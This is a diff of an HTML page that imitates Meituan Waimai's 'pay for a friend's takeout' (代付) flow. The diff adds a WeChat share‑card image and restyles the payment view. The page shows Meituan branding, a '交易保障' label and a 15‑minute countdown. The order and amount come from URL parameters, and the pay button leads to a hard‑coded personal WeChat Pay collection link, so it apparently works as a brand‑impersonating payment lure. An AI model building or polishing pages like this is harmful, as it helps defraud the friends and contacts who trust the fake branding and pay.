@@ -3,9 +3,10 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<!-- 社交软件分享预览：标题与描述 -->
+<!-- 核心：让微信聊天框分享时显示卡片标题、描述和你的卡通图片 (IMG_1872.jpeg) -->
 <meta property="og:title" content="来帮我代付吧 ~ 😋" />
 <meta property="og:description" content="Hi, 你和我的距离只差一顿外卖，快来帮我买单吧！" />
+<meta property="og:image" content="https://lsscqc520-ship-it.github.io/Auto-Forward-Messages/IMG_1872.jpeg" />
 <title>美团外卖 - 交易保障</title>
 <style>
 :root{
@@ -25,20 +26,19 @@ body{margin:0;font-family:Arial,"PingFang SC","Microsoft YaHei",sans-serif;backg
 .nav{display:flex;gap:10px;padding:14px 12px;background:linear-gradient(135deg,#111,#2b2b2b);position:sticky;top:0;z-index:10;overflow:auto}
 .nav-item{padding:10px 14px;border-radius:999px;cursor:pointer;background:rgba(255,255,255,.08);color:#fff;font-weight:700;white-space:nowrap;user-select:none;}
 .nav-item.active{background:var(--primary);color:#111}
-.tab-view{display:none;padding:14px;max-width:1100px;margin:0 auto}
+.tab-view{display:none;padding:14px;max-width:600px;margin:0 auto}
 .tab-view.active{display:block}
 h2{margin:8px 0 14px;font-size:22px;font-weight:800}
 h3{margin:4px 0 12px;font-size:18px;}
-.card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:14px;margin-bottom:12px;box-shadow:var(--shadow)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:16px;margin-bottom:12px;box-shadow:var(--shadow)}
 .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
 input,select{padding:12px 14px;border:1px solid #ddd;border-radius:14px;background:#fff;outline:none;width:100%}
 input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,0,.18)}
-.btn{padding:10px 14px;border:0;border-radius:14px;cursor:pointer;font-weight:700;width:100%}
+.btn{padding:12px 16px;border:0;border-radius:14px;cursor:pointer;font-weight:700;width:100%}
 .btn:hover{opacity:.95}
 .p{background:linear-gradient(135deg,var(--primary),var(--primary-dark));color:#111}
 .w{background:#fff3bf;color:#8a5b00;border:1px solid #ffe08a}
 .d{background:linear-gradient(135deg,#ff7875,#ff4d4f);color:#fff}
-.g{background:linear-gradient(135deg,#4cd964,#00b578);color:#fff}
 .muted{color:var(--muted)}
 .flex-between{display:flex;justify-content:space-between;align-items:center;}
 .clickable{cursor:pointer;transition:transform 0.1s;}
@@ -46,19 +46,11 @@ input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,
 .badge{padding:4px 8px;border-radius:6px;font-size:12px;font-weight:bold;}
 .badge.wait{background:#fff3bf;color:#8a5b00;}
 
-/* 美团卡通风格卡片与预览样式 */
-.cartoon-share-box { background: #1c1c1e; border-radius: 20px; overflow: hidden; color: #fff; box-shadow: 0 12px 32px rgba(0,0,0,0.2); max-width: 450px; margin: 20px auto; }
-.cartoon-header { padding: 14px 18px; font-size: 13px; color: #b0b0b0; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid rgba(255,255,255,0.08); background: #151517; }
-.cartoon-body { background: #fff; color: #111; padding: 24px 20px; text-align: center; }
-
-/* 完美复刻你截图中的卡片预览框 */
-.preview-card-img-wrap { width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid #eee; margin-bottom: 15px; background: #fff; }
-.preview-card-img-wrap img { width: 100%; display: block; }
-
-.cartoon-timer-box { background: #fafafa; border: 1px solid #eee; border-radius: 12px; padding: 14px; margin: 15px 0; }
-.cartoon-timer-label { font-size: 12px; color: #888; margin-bottom: 4px; }
-.cartoon-timer-value { font-size: 28px; font-weight: 900; color: #e64a19; letter-spacing: 2px; }
-.pay-options { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
+/* 好友点开后的美团代付简洁专业页面 */
+.pay-page-container { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 4px 16px rgba(0,0,0,0.06); max-width: 500px; margin: 10px auto; }
+.timer-banner { background: #fffde7; border: 1px solid #ffe082; border-radius: 10px; padding: 12px; text-align: center; margin: 15px 0; color: #8a5b00; font-weight: bold; }
+.item-box { background: #f9f9f9; padding: 12px 15px; border-radius: 10px; margin: 12px 0; font-size: 15px; font-weight: bold; }
+.price-display { font-size: 36px; font-weight: 900; color: #ff5722; text-align: center; margin: 15px 0; }
 </style>
 </head>
 <body>
@@ -93,36 +85,29 @@ input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,
   <div id="order-list" class="muted">加载中...</div>
 </div>
 
-<!-- 4. 好友点开链接看到的：美团卡通代付 & 支付视图 -->
+<!-- 4. 好友点开链接后的代付支付视图（无卡通图，干净专业） -->
 <div id="view-mt-pay" class="tab-view">
-  <div class="cartoon-share-box">
-    <div class="cartoon-header">
-      <span>🟡</span> 美团外卖 | 交易保障护航
-    </div>
-    <div class="cartoon-body">
-      <div style="font-size: 14px; color: #666; margin-bottom: 12px; text-align: left;">Hi, 你和我的距离只差一顿外卖~</div>
-      
-      <!-- 这里完美放置你要求的卡通图片缩略图 (IMG_1872.jpeg) -->
-      <div class="preview-card-img-wrap">
-        <img src="IMG_1872.jpeg" alt="美团代付卡通卡片" onerror="this.src='https://i.ibb.co/3s23w27g/image.png'" />
-      </div>
+  <div class="pay-page-container">
+    <div style="font-size: 14px; color: #888; border-bottom: 1px solid #eee; padding-bottom: 8px;">🟡 美团外卖 | 交易保障护航</div>
+    
+    <div style="font-size: 18px; font-weight: 800; color: #222; margin-top: 15px;">待代付订单</div>
 
-      <div class="cartoon-timer-box">
-        <div class="cartoon-timer-label">⏱️ 剩余支付时间</div>
-        <div class="cartoon-timer-value" id="mt-countdown">14:59</div>
-      </div>
-
-      <div style="font-size: 14px; color: #555; margin-bottom: 5px; text-align: left;">代付商品清单：</div>
-      <div style="font-size: 16px; font-weight: bold; color: #222; margin-bottom: 15px; text-align: left; background:#f9f9f9; padding:10px; border-radius:8px;" id="mt-order-content">外卖订单</div>
-      
-      <div style="font-size: 14px; color: #888;">需付款金额</div>
-      <div style="font-size: 36px; font-weight: 900; color: #ff5722; margin-bottom: 15px;">¥<span id="mt-order-total">0.00</span></div>
-      
-      <!-- 支付双保险按钮：直接跳转官方微信支付链接，或长按识别/前往支付 -->
-      <div class="pay-options">
-        <button class="btn p" style="font-size:18px; border-radius:12px; padding: 16px;" onclick="goToWeChatPay()">✨ 确认并前往微信支付买单</button>
-      </div>
+    <div class="timer-banner">
+      ⏱️ 剩余支付时间：<span id="mt-countdown" style="font-size: 18px; color: #e64a19;">14:59</span>
     </div>
+
+    <div style="font-size: 13px; color: #666;">代付商品清单：</div>
+    <div class="item-box" id="mt-order-content">外卖订单</div>
+
+    <div style="font-size: 13px; color: #666; text-align: center;">需付款金额</div>
+    <div class="price-display">¥<span id="mt-order-total">0.00</span></div>
+
+    <div style="background: #fdfdfd; border: 1px solid #eee; padding: 12px; border-radius: 10px; margin-bottom: 15px; font-size: 13px; color: #666;">
+      付款须知：<br>1. 请于15分钟内完成支付。<br>2. 点击下方按钮直接前往微信支付。
+    </div>
+
+    <!-- 微信支付跳转按钮 -->
+    <button class="btn p" style="font-size: 18px; border-radius: 14px; padding: 16px;" onclick="goToWeChatPay()">✨ 确认并前往微信支付买单</button>
   </div>
 </div>
 
@@ -148,7 +133,7 @@ input:focus,select:focus{border-color:#ffcf33;box-shadow:0 0 0 4px rgba(255,208,
 </div>
 
 <script>
-// 你提供的官方微信支付链接
+// 你的官方微信支付链接
 const WECHAT_PAY_URL = 'https://payapp.wechatpay.cn/sjt/qr/AQFnMljnPzZWMgkyr_fDaWLI';
 
 let cart = {}; 
@@ -282,7 +267,7 @@ function fetchOrders() {
       <div class="muted" style="margin: 8px 0;">${esc(order.content)}</div>
       <div class="flex-between" style="margin-top:10px;">
         <b style="color:var(--danger); font-size:18px;">¥${Number(order.total).toFixed(2)}</b>
-        <button class="btn p" style="width:auto;" onclick="shareOrder('${esc(order.content)}', ${order.total})">🎁 发起卡通代付分享</button>
+        <button class="btn p" style="width:auto;" onclick="shareOrder('${esc(order.content)}', ${order.total})">🎁 一键分享代付卡片</button>
       </div>
     </div>
   `).join('');
@@ -292,7 +277,7 @@ async function shareOrder(content, total) {
   const shareUrl = window.location.origin + window.location.pathname + 
                    "?amount=" + total + "&content=" + encodeURIComponent(content);
   const shareData = {
-    title: '🛵 来帮我代付外卖吧 ~',
+    title: '来帮我代付吧 ~ 😋',
     text: `Hi, 你和我的距离只差一顿外卖~ ${content} 需付款 ¥${total}`,
     url: shareUrl
   };
@@ -361,7 +346,6 @@ function initRouter() {
 }
 
 function goToWeChatPay() {
-  // 直接跳转到你提供的微信支付链接
   window.location.href = WECHAT_PAY_URL;
 }
 
@@ -371,4 +355,3 @@ window.onload = () => {
 </script>
 </body>
 </html>
-
